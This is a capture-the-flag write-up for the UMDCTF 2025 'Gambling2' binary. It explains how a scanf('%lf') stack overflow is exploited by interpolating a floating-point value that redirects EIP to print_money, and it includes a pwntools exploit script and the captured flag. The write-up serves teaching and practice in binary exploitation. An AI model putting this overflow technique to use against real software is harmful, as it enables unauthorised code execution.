# Gambling2 – UMDCTF 2025 Writeup

## Challenge Overview
We are provided with the following files:
- `Dockerfile`
- `gambling` binary
- Source code (`gambling.c`)
- `Makefile`


![image](https://github.com/user-attachments/assets/53bc5413-86d4-4dd7-ac4d-72972889fcda)


Our goal is to exploit the program and retrieve the flag.

---
# Reconnaissance
### Step 1: Checking Binary Protections
First, we run `checksec` on the provided binary to understand what security mechanisms are enabled:

```bash
checksec --file=./gambling
```

![image](https://github.com/user-attachments/assets/abc3e88f-1a49-41c1-9e43-8ef6c4b8ddc2)


**Observations**:
- **No Stack Canary**: Buffer overflows won't be immediately detected by stack protections.
- **NX (Non-Executable Stack)**: We can't inject and execute shellcode directly on the stack.
- **PIE Disabled**: Executable addresses are fixed, making ROP and direct address overwrites easier.

### Step 2: Reviewing the Source Code
Upon inspecting the `gambling.c` source file, we observe how the input is handled and what functions are available.
![image](https://github.com/user-attachments/assets/6d9d5463-3f66-4ca2-a504-c9f5f2a7332e)


**Key Takeaways**:
- The program reads user input using `scanf("%lf", &var)`, expecting **doubles** (floating-point numbers).
- The presence of a `print_money()` function which could be useful for exploitation.

---

# Exploitation
### Step 3: Finding the Target Function
Using GDB (`gdb ./gambling`), we disassemble `print_money` to find its memory address:
```bash
disas print_money
```

![image](https://github.com/user-attachments/assets/5b4d1cb1-70c7-48cd-ade8-e6ee7aa7a95a)

- `print_money` is located at address `0x080492c0`.


Since PIE is disabled, this address remains **static** during program execution.

---

### Step 4: Strategy Outline
Given what we know:
- The buffer overflow occurs through reading **floating-point inputs**.
- We aim to overwrite **EIP** (the instruction pointer) to jump to `print_money`.

**Challenges**:
- Directly writing a memory address as a floating-point number is not trivial because of **IEEE-754 encoding** for doubles.

Thus, we take an **empirical approach**:
- Send various floating-point values.
- Observe how the EIP changes.
- Use interpolation to find the exact floating-point value that overwrites EIP with the address of `print_money`.

---

### Step 5: Local Testing and Float Interpolation
By testing various floats locally, we observed the relationship between input floats and resulting EIP:

|Input Float|Resulting EIP|
|:--|:--|
|`0.000...004869`|`0x8049400`|
|`0.000...00487`|`0x8049515`|

**Conclusion**:
- Larger float → Lower address.
- Smaller float → Higher address.

We needed to precisely land on `0x80492c0`.

---

### Step 6: Calculating the Exact Float
Instead of bruteforcing, we calculate it using linear interpolation:
```python
float1 = 0.000...004869
float2 = 0.000...00487
eip1 = 0x8049400
eip2 = 0x8049515
eip_target = 0x80492c0

delta_eip = eip2 - eip1
delta_float = float2 - float1

ratio = delta_float / delta_eip
offset_eip = eip_target - eip1
offset_float = offset_eip * ratio

float_target = float1 + offset_float

print(f"[+] Exact float needed: {float_target:.400f}")
```

This gives us the exact float value required to control EIP.

Result:
```
0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048678447653429606926762156265085299415604106647379534502196788585758286387045593904549590297537598720611109479754048472644682294918
```

---

### Step 7: Building the Exploit Script

We can now automate the exploitation using `pwntools`:
```python
from pwn import *
import struct
import argparse

context.binary = './gambling'
context.arch = 'i386'
context.log_level = 'warn'

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, help='Remote host')
parser.add_argument('--port', type=int, help='Remote port')
args = parser.parse_args()

# Exact float string to send
exact_float_str = "0.0000...48672644682294918"

def start_process():
    if args.host and args.port:
        return remote(args.host, args.port)
    else:
        return process('./gambling')

if __name__ == "__main__":
    p = start_process()
    p.recvuntil(b'Enter your lucky numbers: ')

    # Send the payload
    payload = "0 0 0 0 0 0 " + exact_float_str
    print(f"[+] Sending payload: {payload}")
    p.sendline(payload.encode())

    # Check if we get a shell
    p.sendline(b'id')
    print(p.recvline())
    result = p.recvline()
    if b'uid' in result:
        print("[+] SUCCESS: Shell obtained!")
        print(result)
    p.close()
```

---

# Final Result
We run the script, connect to the service, send the payload, and get the shell:

![image](https://github.com/user-attachments/assets/62764f39-37a7-4e05-9228-612335cb2f1e)


Running the payload, we successfully capture the flag:
```
UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
```

---
